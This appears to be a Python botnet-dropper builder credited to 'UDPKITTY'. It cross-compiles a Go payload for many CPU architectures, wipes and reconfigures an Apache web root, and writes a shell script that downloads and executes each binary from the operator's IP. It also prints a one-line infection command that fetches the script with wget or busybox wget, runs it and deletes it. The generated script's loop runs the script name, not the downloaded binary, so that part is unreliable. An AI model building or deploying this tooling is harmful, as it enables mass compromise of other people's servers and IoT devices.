import os
from colorama import Fore
import subprocess

ALL_PLATFORMS = ['windows/386', 'darwin/amd64', 'linux/amd64', 'linux/386', 'linux/arm', 'freebsd/amd64', 'freebsd/386', 'windows/amd64', 'linux/arm64', 'linux/arm/5', 'linux/arm/7', 'linux/mips', 'linux/mips64', 'linux/mips64le', 'linux/mipsle', 'linux/ppc64']
BINARIES_DIR = 'BINARIES'

HEARTBLEED_CC = r'''
HEARTBLEED DROPPER
FOR GO
'''

def compile_for_platform(platform, source_file):
    os.makedirs(BINARIES_DIR, exist_ok=True)
    try:
        os_name, arch, armversion = platform.split('/')
    except Exception:
        os_name, arch = platform.split('/')


    output_ext = '.exe' if os_name == 'windows' else '.bin'
    if len(platform.split('/')) == 3:
        output_filename = f'{os_name}_{arch}{armversion}{output_ext}'
    if len(platform.split("/")) == 2:
        output_filename = f'{os_name}_{arch}{output_ext}'

    if len(platform.split('/')) == 3:
        cmd = ['env', f'GOARCH={arch}', f'GOOS={os_name}', 'GOARM=' + platform.split('/')[2], 'go', 'build', '-o', os.path.join(BINARIES_DIR, output_filename)]
    if len(platform.split('/')) == 2:
        cmd = ['env', f'GOARCH={arch}', f'GOOS={os_name}', 'go', 'build', '-o', os.path.join(BINARIES_DIR, output_filename)]
    
    cmd.append(source_file)

    try:
        subprocess.run(cmd, check=True)
        # Make the compiled binary executable
        if os_name != 'windows':
            binary_path = os.path.join(BINARIES_DIR, output_filename)
            os.chmod(binary_path, 0o755)  # Set executable permissions
    except subprocess.CalledProcessError as e:
        print(f"{Fore.RED}Error compiling for {platform}: {e if e is not None else ''}{Fore.WHITE}")


def run(cmd):
    subprocess.call(cmd, shell=True)

def main():
    print(Fore.RED + HEARTBLEED_CC)
    
    source_file = input("Enter the filepath of the Go source script: " + Fore.WHITE)
    

    ip = input("Enter server IP: " + Fore.WHITE)

    for platform in ALL_PLATFORMS:
        print(f"{Fore.YELLOW}[?] Compiling for {platform}...")
        compile_for_platform(platform, source_file)
        print(f"{Fore.GREEN}Compilation for {platform} complete.")

    print(f"\n{Fore.GREEN}Cross compilation has been complete! See {BINARIES_DIR}/ to view compiled executables!{Fore.WHITE}\n")

    print(f"\n{Fore.GREEN}Generating payload... You may need to enter y\n")
    script_name = "heartbleed.sh"
    run("go get github.com/nightlyone/lockfile")
    run("rm -rf /var/www/html/*")
    run("sudo apt install apache2 || sudo yum install httpd || sudo dnf install httpd || sudo zypper install apache2 || sudo pacman -S apache")
    run("sudo systemctl restart apache2 || sudo systemctl start httpd || sudo systemctl start apache")
    run("sudo systemctl enable httpd")
    run("sudo firewall-cmd --permanent --add-port=443/tcp")
    run("sudo firewall-cmd --permanent --add-port=80/tcp")
    run("sudo firewall-cmd --reload")
    run(f"sudo mkdir -p /var/www/html")
    run(f"touch /var/www/html/{script_name}")
    run(f'echo -e "#!/bin/bash" >> /var/www/html/{script_name}')
    bins = os.listdir(os.path.join(os.getcwd(), BINARIES_DIR))
    for bin in bins:
        run(f"sudo cp {os.path.join(os.getcwd(), BINARIES_DIR)}{os.path.sep}{bin} /var/www/html/{bin}")
        print(f"{Fore.LIGHTGREEN_EX}Copied {os.path.join(os.getcwd(), BINARIES_DIR)}{os.path.sep}{bin} into /var/www/html/")
    for bin in bins:
        run(f'echo -e "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget https://{ip}/{bin} || curl -O https://{ip}/{bin}; chmod 777 {script_name}; sh {script_name}; rm -f {script_name}" >> /var/www/html/{script_name}')
    run(f"sudo chmod 644 /var/www/html/*")
    run("service xinetd restart")
    run("service httpd restart")
    run("sudo rm /var/www/html/index.html || sudo rm /var/www/html/index.html")
    run("touch /var/www/html/index.html")
    print(f"{Fore.WHITE}There is one more step that you need to do: ")
    print(""" Run the commands that accord to your system:
    
    sudo nano /etc/httpd/conf/httpd.conf   # For CentOS/Fedora
    
    sudo nano /etc/apache2/apache2.conf   # For Debian/Ubuntu
    """)
    print("Scroll down until you see:")
    print("""
    ServerRoot "/etc/httpd"

    #
    # Listen: Allows you to bind Apache to specific IP addresses and/or
    # ports, instead of the default. See also the <VirtualHost>
    # directive.
    #
    # Change this to Listen on specific IP addresses as shown below to
    # prevent Apache from glomming onto all bound IP addresses.
    #
    #Listen 12.34.56.78:80
    Listen [SERVER IP HERE]:80
    
    #
    # Dynamic Shared Object (DSO) Support

    """)
    print("Change it to your server IP and you can use the following payload.\n")
    print(f"{Fore.LIGHTGREEN_EX}Successfully cross compiled!{Fore.WHITE}")
    print(f"{Fore.LIGHTYELLOW_EX}cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://{ip}/{script_name}; busybox wget http://{ip}/{script_name}; chmod 777 {script_name}; sh {script_name}; rm -f {script_name}{Fore.WHITE}")
    print()
    print(f"Created by UDPKITTY https://t.me/udpkitty")
    print()


if __name__ == '__main__':
    main()
